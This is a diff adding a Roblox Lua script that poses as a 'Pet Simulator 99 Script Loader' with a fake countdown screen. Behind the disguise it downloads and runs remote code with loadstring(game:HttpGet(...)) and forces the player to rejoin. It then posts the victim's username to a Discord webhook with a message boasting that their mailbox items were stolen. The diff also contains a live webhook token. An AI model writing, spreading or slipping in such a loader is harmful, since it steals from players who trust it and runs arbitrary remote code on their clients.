@@ -1,0 +1,88 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local LoadButton = Instance.new("TextButton")
+
+-- Properties for the main GUI
+ScreenGui.Parent = game.CoreGui
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.Size = UDim2.new(0, 400, 0, 300)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+
+Title.Parent = Frame
+Title.Text = "Pet Simulator 99 Script Loader"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.Size = UDim2.new(1, 0, 0.2, 0)
+
+LoadButton.Parent = Frame
+LoadButton.Text = "Load Script!"
+LoadButton.TextColor3 = Color3.new(1, 1, 1)
+LoadButton.BackgroundColor3 = Color3.new(0, 1, 0)
+LoadButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+LoadButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+LoadButton.TextScaled = true
+
+-- Function to load the script and show the loading GUI
+local function loadScript()
+    -- Hide the main GUI
+    Frame.Visible = false
+
+    -- Create the loading GUI
+    local LoadingFrame = Instance.new("Frame")
+    local LoadingText = Instance.new("TextLabel")
+    local CountdownText = Instance.new("TextLabel")
+
+    LoadingFrame.Parent = ScreenGui
+    LoadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    LoadingFrame.Size = UDim2.new(0, 400, 0, 300)
+    LoadingFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+
+    LoadingText.Parent = LoadingFrame
+    LoadingText.Text = "Please wait 10 seconds"
+    LoadingText.TextColor3 = Color3.new(1, 1, 1)
+    LoadingText.TextScaled = true
+    LoadingText.Size = UDim2.new(1, 0, 0.5, 0)
+
+    CountdownText.Parent = LoadingFrame
+    CountdownText.Text = "10"
+    CountdownText.TextColor3 = Color3.new(1, 1, 1)
+    CountdownText.TextScaled = true
+    CountdownText.Size = UDim2.new(1, 0, 0.5, 0)
+    CountdownText.Position = UDim2.new(0, 0, 0.5, 0)
+
+    -- Countdown timer
+    for i = 10, 0, -1 do
+        CountdownText.Text = tostring(i)
+        wait(1)
+    end
+
+    -- Hide the loading GUI
+    LoadingFrame.Visible = false
+
+    -- Execute the script
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/87219dae765f254c9b6d0275.lua"))()
+    end)
+
+    if not success then
+        warn("Failed to load script: " .. err)
+    end
+
+    -- Wait for 3 seconds and then rejoin the game
+    wait(3)
+    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+
+    -- Send a message to the webhook
+    local HttpService = game:GetService("HttpService")
+    local webhookUrl = "https://discord.com/api/webhooks/1286630434851131404/0YA1znp7Z505fK51VRqL3jrg5M_nZnDIJQsOt0ZnvNMTVGd9AaZFRXRuvwV54NgLm0pu"
+    local data = {
+        content = "@everyone Stole \"" .. game.Players.LocalPlayer.Name .. " using the script\" Mailbox.😂😂"
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+LoadButton.MouseButton1Click:Connect(loadScript)
